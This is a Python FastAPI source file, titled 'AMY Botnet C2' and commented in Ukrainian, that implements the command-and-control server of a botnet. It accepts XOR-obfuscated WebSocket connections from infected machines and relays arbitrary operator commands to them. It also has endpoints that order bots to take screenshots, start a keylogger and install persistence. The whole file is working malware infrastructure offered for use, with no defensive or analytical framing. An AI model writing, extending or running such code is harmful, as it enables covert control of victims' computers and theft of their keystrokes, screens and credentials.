from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import base64
import os

app = FastAPI(title="AMY Botnet C2")

active_bots = {}          # bot_id -> websocket (від client.py)
terminal_sessions = {}    # bot_id -> list of UI terminals

os.makedirs("screenshots", exist_ok=True)
os.makedirs("logs", exist_ok=True)

KEY = b"AMY_2026_SECRET"   # Має співпадати з X_KEY у client.py

def encrypt_message(msg: str) -> str:
    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    try:
        encrypted = base64.b64decode(encoded)
        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return encoded

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    with open("ui/index.html", encoding="utf-8") as f:
        return f.read()

# ==================== BOT CONNECTION ====================
@app.websocket("/ws/{bot_id}")
async def bot_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    print(f"[+] Bot {bot_id} CONNECTED")
    try:
        while True:
            encrypted_data = await websocket.receive_text()
            data = decrypt_message(encrypted_data)
            print(f"[BOT → C2] {bot_id}: {data[:200]}")

            # Пересилаємо відповідь у термінал UI
            if bot_id in terminal_sessions:
                for ws in terminal_sessions[bot_id]:
                    await ws.send_text(f"[RESPONSE] {data}")
    except WebSocketDisconnect:
        active_bots.pop(bot_id, None)
        print(f"[-] Bot {bot_id} DISCONNECTED")

# ==================== UI TERMINAL ====================
@app.websocket("/terminal/{bot_id}")
async def terminal_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    if bot_id not in terminal_sessions:
        terminal_sessions[bot_id] = []
    terminal_sessions[bot_id].append(websocket)
    print(f"[UI] Terminal connected to {bot_id}")

    try:
        while True:
            command = await websocket.receive_text()
            print(f"[UI → BOT] {bot_id}: {command}")

            if bot_id in active_bots:
                await active_bots[bot_id].send_text(encrypt_message(command))
                await websocket.send_text(f"> Executing: {command}")
            else:
                await websocket.send_text("Error: Bot is offline")
    except WebSocketDisconnect:
        if bot_id in terminal_sessions:
            terminal_sessions[bot_id].remove(websocket)

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/screenshot/{bot_id}")
async def trigger_screenshot(bot_id: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message("screenshot"))
        return {"status": "sent"}
    return {"status": "offline"}

@app.get("/keylogger/{bot_id}")
async def trigger_keylogger(bot_id: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message("start_keylogger"))
        return {"status": "sent"}
    return {"status": "offline"}

@app.get("/persistence/{bot_id}")
async def trigger_persistence(bot_id: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message("add_persistence"))
        return {"status": "sent"}
    return {"status": "offline"}
